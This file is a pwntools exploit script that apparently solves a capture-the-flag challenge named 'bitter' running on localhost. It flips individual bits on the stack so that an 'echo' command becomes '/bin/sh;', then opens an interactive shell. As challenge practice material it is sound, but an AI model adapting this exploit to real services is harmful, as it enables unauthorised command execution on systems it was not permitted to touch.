#!/usr/bin/env python3

from pwn import *

elf = ELF('./container/bitter')

HOST = 'localhost'
PORT = 50000

io = remote(HOST, PORT)

cmd_orig = 'echo Thank you for'
cmd_target = '/bin/sh;'
delta = bytes(x^y for x,y in zip(cmd_orig.encode(), cmd_target.encode()))

# From stack layout
cmd_offset = -0x48
hummus_offset = -0xA8
bitter_offset = -0x98

bitter_pos = bitter_offset - hummus_offset
base_pos = cmd_offset - hummus_offset

for iby, by in enumerate(delta):
    if by == 0:
        continue
    for i in range(8):
        bi = (by >> i) & 1
        if bi == 0:
            continue

        io.recvline_contains(b'hummus is ')
        io.recvuntil(b'position to flip: ')
        pos = 8*(base_pos + iby) + i
        io.sendline(f'{pos}'.encode())

io.recvline_contains(b'hummus is ')
io.recvuntil(b'position to flip: ')
io.sendline(f'{bitter_pos*8}'.encode())
io.interactive()
